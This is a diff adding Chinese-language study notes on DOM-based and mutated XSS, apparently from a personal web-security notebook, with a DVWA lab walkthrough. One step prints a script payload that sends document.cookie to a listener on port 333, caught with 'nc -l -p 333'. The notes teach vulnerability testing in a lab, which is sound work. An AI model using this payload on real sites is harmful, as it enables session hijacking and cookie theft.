@@ -4568,15 +4568,110 @@ OWASP Top10 2017 第七，浏览器将用户输入的内容，当做脚本执行
 
 ### DOM型 XSS 
 
+#### DOM 定义
+
+DOM 模型用一个逻辑树来表示一个文档，每个分支的终点都是一个节点 （ node） ，每个节点都包含着对象（ objects） 。 
+
+DOM 的方法（ methods） 让你可以用特定方式操作这个树，用这些方法你可以改变文档的结构、样式或者内容。 
+
+![1618654276190](HackerMeWeb.assets/1618654276190.png)
+
+
+
+#### DOM 型 XSS 漏洞定义
+
+DOM 型 XSS 其实是一种特殊类型的反射型 XSS，通过 JS 操作 DOM 树动态地输出数据到页面，而不依赖于将数据提交给服务器端，它是基于 DOM 文档对象模型的一种漏洞。 
+
+```html
+<html>
+	<body>
+    	<script>
+        	document.write("<script>alert(0);<\/script>");
+        </script>
+    </body>
+</html>
+```
+
+
+
+#### DOM 型 XSS 漏洞与反射型的异同点和危害
+
+- 同：
+  - 都是没有控制好输入，并且把 javaScript 脚本 输入作为输出插入到 HTML 页面。
+- 异：
+  - 反射型 XSS 是经过后端语言后， 页面引用后端输出生效。 
+  - DOM XSS 是经过 JS 对 DOM 树直接操作后插入到页面。
+- 危害性：
+  - 前后端分离，不经过 WAF 的检测。
+
+
+
+#### DOM型 XSS 测试示例
+
+- 测试代码的静态页面为
+  - HackerMeCode\XSS\DOMXSS\DomXSSDemo.html
+- 正常输入
+  - 输入：rmliu ，点击提交
+  - 会看到页面显示出 rmliu 的内容
+- XSS 输入
+  - 输入：<script>alert(rmliu);</script>，点击提交
+  - 此时，就会直接在页面上弹出新的对话框，内容为 rmliu
+
+
+
+#### DVMA 靶机测试
+
+- 安装，并登录 DVWA 靶机
+- 选择bug类型：XSS (DOM)
+- 正常输入
+  - Please choose a language，选择 English，点击 Select
+  - 此时地址栏显示的网址是 ，http://127.0.0.1:81/vulnerabilities/xss_d/?default=English
+- XSS 输入
+  - 在地址栏中，将 English ，变为 <script>alert(1);</script>
+  - 此时的访问地址为：http://127.0.0.1:81/vulnerabilities/xss_d/?default=<script>alert(1);</script>
+  - 此时就会弹出对话框，内容为1
+  - 并且页面上的选择框中的内容为空，进入控制台，查看元素，可以知道此时选择框的内容就是输入的 script  脚本内容
+- 复杂 XSS 输入
+  - 将访问地址变为：http://127.0.0.1:81/vulnerabilities/xss_d/?default=<script>var pic=document.createElement("img"); pic.src="http://127.0.0.1:333/getCookie?" + escape(document.cookie)</script>
+  - 并且在本地使用nc，监听本地的333端口，在命令行中输入：nc -l -p 333
+  - 此时，就可以在命令行中看到，请求中的信息，就完成了 DOM 型 XSS 利用
+  - ![1618655929733](HackerMeWeb.assets/1618655929733.png)
 
 
 
 
 
+### 突变 XSS （mXSS）
+
+#### 定义
+
+- m --> Mutated-突变
+- 攻击者输入看似安全的内容，在解析标记时经过浏览器重写或者修改，发生突变，生成不安全的代码并执行，即mXSS，极难被检测和过滤。 
 
 
 
+#### HTML 过滤器 
 
+- 元素: <div>, <b>, <i> and <img>. 
+- 属性: src. 
+- 示例程序
+  - HackerMeCode\XSS\mXSS\mXSS.html
+  - HackerMeCode\XSS\mXSS\mXSSExample.html
+  - HackerMeCode\XSS\mXSS\mXSSDemo.html
+
+
+
+#### jQuery 跨站脚本漏洞 
+
+- 网址
+  - CNNVD-202004-2420
+  - http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202004-2420
+- 漏洞
+  - ![1618658318631](HackerMeWeb.assets/1618658318631.png)
+
+
+
+### 伪协议 
 
 
 
